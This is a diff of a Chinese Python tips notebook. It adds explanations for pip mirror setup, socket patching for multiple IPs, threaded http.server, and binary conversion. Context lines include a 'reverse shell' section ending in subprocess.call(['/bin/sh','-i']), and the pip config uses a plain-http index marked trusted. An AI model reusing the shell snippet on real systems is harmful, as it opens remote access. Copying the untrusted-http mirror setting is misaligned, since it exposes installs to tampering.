@@ -1,12 +1,14 @@
 # 写在前面
 
-嗯哼，Python很好玩呢...记录一点黑科技咯
+嗯哼，Python很好玩呢...有人说Python是能运行的伪代码，就写代码的速度而言是显著优于C的，也有很多好用的类库呢，反正强烈推荐这门语言啦~
 
 当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py
 
 ----
 
 # 设置pip源
+
+在Linux服务器上安装python的包时，执行这段代码可以将pip源改为国内的豆瓣源，能显著提高包的下载速度
 
 ```bash
 mkdir -p ~/.pip
@@ -16,6 +18,15 @@ index-url = http://pypi.doubanio.com/simple/
 [install]
 trusted-host=pypi.doubanio.com
 """>~/.pip/pip.conf
+```
+
+至于Windows用户，在用户目录下创建一个pip目录，如：C:\Users\chenyuan\pip，新建文件pip.ini，内容如下：
+
+```
+[global]
+index-url = http://pypi.doubanio.com/simple/
+[install]
+trusted-host=pypi.doubanio.com
 ```
 
 # 反弹shell
@@ -40,6 +51,8 @@ p=subprocess.call(["/bin/sh","-i"])
 
 # 让requests使用多个IP
 
+这里用覆盖socket.create_connection函数的方法实现，注意`import requests`一定要写在后面，否则requests自己已经载入完了socket包再去改就没有效果
+
 ```python
 import socket
 real_create_conn = socket.create_connection
@@ -55,21 +68,41 @@ import requests
 
 # Python多线程模板
 
+使用threading模块进行开发
+
 [MultiThread_Template.py](code/MultiThread_Template.py)
 
-## BaseHTTPServer并发性改善
+## http.server（BaseHTTPServer）并发性改善
 
 > 参考资料：[利用Python中SocketServer 实现客户端与服务器间非阻塞通信](http://blog.csdn.net/cnmilan/article/details/9664823)
 
-> 直接修改BaseHTTPServer的代码中的一个细节，可以大幅度提高使用BaseHTTPServer能支持的并发性
+> 直接修改BaseHTTPServer的代码中的一个细节，将BaseHTTPServer类继承的原先只能支持单个请求的SocketServer.TCPServer改为每个连接一个线程的SocketServer.ThreadingTCPServer，使BaseHTTPServer能支持并发而不是一次只能处理单个请求
+
+Python3的方法：
+
+在Python3中BaseHTTPServer改名为http.server了，首先找到http.server所在的py文件：
+
+    python3 -c "import http.server; print(http.server)"
+
+修改其提示的文件，例如我这里是`/usr/lib/python3.4/http/server.py`
+
+搜索`class HTTPServer`，如果是用vim可以用`/class HTTPServer`
+
+修改找到的这一行，改为：
+
+```python
+class HTTPServer(socketserver.ThreadingTCPServer):
+```
+
+Python2的方法：
 
 首先找到BaseHTTPServer在哪：
 
      python -c "import BaseHTTPServer; print(BaseHTTPServer)"
 
-修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py
+修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py，注意不要打开他直接提示的pyc文件而是要对应的同名py文件
 
-找到这行：
+找到这行（vim中可以输入`/class HTTPServer`进行搜索）：
 
 ```python
 class HTTPServer(SocketServer.TCPServer):
@@ -211,6 +244,8 @@ import binascii
 s="0110001101111001"
 ans=binascii.unhexlify('%x'%int(s,2))
 ```
+
+补充：相应的如果要把十进制转为二进制，可以用bin(123)[2:]
 
 ----
 
